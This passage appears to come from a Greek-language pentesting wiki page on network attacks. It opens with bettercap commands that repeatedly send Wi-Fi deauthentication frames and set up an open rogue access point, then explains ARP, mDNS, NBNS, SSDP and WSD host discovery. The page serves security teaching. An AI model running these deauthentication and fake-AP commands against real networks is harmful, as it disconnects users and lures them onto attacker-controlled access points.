set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Σημειώσεις Ενεργής Ανακάλυψης

Λάβετε υπόψη ότι όταν αποστέλλεται ένα πακέτο UDP σε μια συσκευή που δεν έχει την ζητούμενη θύρα, αποστέλλεται ένα ICMP (Port Unreachable).

### **ARP ανακάλυψη**

Τα πακέτα ARP χρησιμοποιούνται για να ανακαλύψουν ποιες IPs χρησιμοποιούνται μέσα στο δίκτυο. Ο υπολογιστής πρέπει να στείλει ένα αίτημα για κάθε πιθανή διεύθυνση IP και μόνο οι χρησιμοποιούμενες θα απαντήσουν.

### **mDNS (multicast DNS)**

Το Bettercap στέλνει ένα αίτημα MDNS (κάθε X ms) ζητώντας για **\_services\_.dns-sd.\_udp.local**. Η μηχανή που βλέπει αυτό το πακέτο συνήθως απαντά σε αυτό το αίτημα. Στη συνέχεια, αναζητά μόνο μηχανές που απαντούν σε "services".

**Εργαλεία**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Το Bettercap εκπέμπει πακέτα στη θύρα 137/UDP ζητώντας το όνομα "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Το Bettercap εκπέμπει πακέτα SSDP αναζητώντας κάθε είδους υπηρεσίες (UDP Port 1900).

### **WSD (Web Service Discovery)**

Το Bettercap εκπέμπει πακέτα WSD αναζητώντας υπηρεσίες (UDP Port 3702).

## Αναφορές

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Αξιολόγηση Ασφάλειας Δικτύου: Γνωρίστε το Δίκτυό σας (3η έκδοση)**
- **Πρακτικός Χάκινγκ IoT: Ο Οριστικός Οδηγός για την Επίθεση στο Διαδίκτυο των Πραγμάτων. Από τους Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
